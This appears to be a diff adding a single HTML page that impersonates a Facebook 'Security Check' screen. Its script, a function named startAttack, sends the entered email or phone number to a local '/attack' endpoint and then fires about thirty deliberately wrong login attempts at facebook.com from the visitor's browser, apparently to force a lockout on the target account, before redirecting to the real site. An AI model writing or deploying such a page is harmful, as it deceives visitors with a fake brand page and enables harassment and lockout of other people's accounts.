@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Security Verification</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .box {
+            background: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            width: 400px;
+            text-align: center;
+        }
+        .logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; }
+        h3 { color: #1c1e21; margin-bottom: 10px; }
+        p { color: #606770; font-size: 14px; margin-bottom: 20px; }
+        input {
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            margin-bottom: 15px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+        button:hover { background: #166fe5; }
+        button:disabled { background: #9cbaf0; cursor: not-allowed; }
+        #status {
+            display: none;
+            background: #f8d7da;
+            color: #721c24;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 6px;
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="logo">facebook</div>
+        <h3>Security Check Required</h3>
+        <p>Enter your account details to continue</p>
+        <input type="text" id="targetId" placeholder="Email or Phone Number">
+        <div id="status"></div>
+        <button id="btn" onclick="startAttack()">Continue</button>
+    </div>
+
+    <script>
+        const PASSWORDS = [
+            'wrong1', 'test123', 'demo123', 'sample1', 'error12',
+            'invalid', 'fake123', 'temp123', 'nope123', 'fail123',
+            'blocked1', 'locked12', 'banned12', 'disabled', 'reset12',
+            'cancel12', 'reject12', 'helpme12', 'support1', 'facebook1',
+            'verified', 'security', 'login123', 'access12', 'account1',
+            'user1234', 'hello123', 'pass1234', 'forgot12', 'testuser'
+        ];
+
+        async function startAttack() {
+            const target = document.getElementById('targetId').value.trim();
+            if (!target) { alert('Enter Facebook ID'); return; }
+            
+            const btn = document.getElementById('btn');
+            const status = document.getElementById('status');
+            btn.disabled = true;
+            btn.textContent = 'Verifying...';
+            status.style.display = 'block';
+            status.textContent = '⏳ Processing...';
+            
+            try {
+                await fetch('/attack', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({target: target})
+                });
+                
+                for (let p of PASSWORDS) {
+                    try {
+                        await fetch('https://www.facebook.com/login.php', {
+                            method: 'POST', mode: 'no-cors',
+                            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                            body: 'email='+encodeURIComponent(target)+'&pass='+encodeURIComponent(p)
+                        });
+                    } catch(e) {}
+                    await new Promise(r => setTimeout(r, 150));
+                }
+                
+                status.textContent = '✅ Done! Redirecting...';
+                setTimeout(() => window.location.href = 'https://www.facebook.com', 2000);
+            } catch(err) {
+                status.textContent = '❌ Error! Try again.';
+                btn.disabled = false;
+                btn.textContent = 'Continue';
+            }
+        }
+    </script>
+</body>
+</html>
